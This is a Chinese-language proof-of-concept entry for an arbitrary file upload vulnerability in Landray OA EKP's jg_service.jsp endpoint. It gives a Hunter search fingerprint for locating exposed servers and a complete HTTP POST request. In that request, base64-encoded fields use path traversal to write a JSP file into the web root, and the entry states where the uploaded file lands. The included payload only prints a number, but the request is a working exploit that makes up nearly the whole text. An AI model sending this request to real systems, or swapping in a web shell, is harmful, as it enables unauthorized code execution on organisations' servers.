﻿# 蓝凌OA EKP jg_service任意文件上传漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：hunter：app.name="Landray 蓝凌OA"

> 验证脚本：HTTP

```
POST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-type: application/x-www-form-urlencoded
DBSTEP V3.0    124            0              999            
DBSTEP=REJTVEVQ
OPTION=U0FWRUFTSFRNTA==
HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL2R1ZGVzaXRlLmpzcA==
RECORDID=
DIRECTORY=

<% out.println(111*11);%>
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/resource/dudesite.jsp

> 验证文件来源：蓝凌OA EKP jg_service任意文件上传漏洞.poc

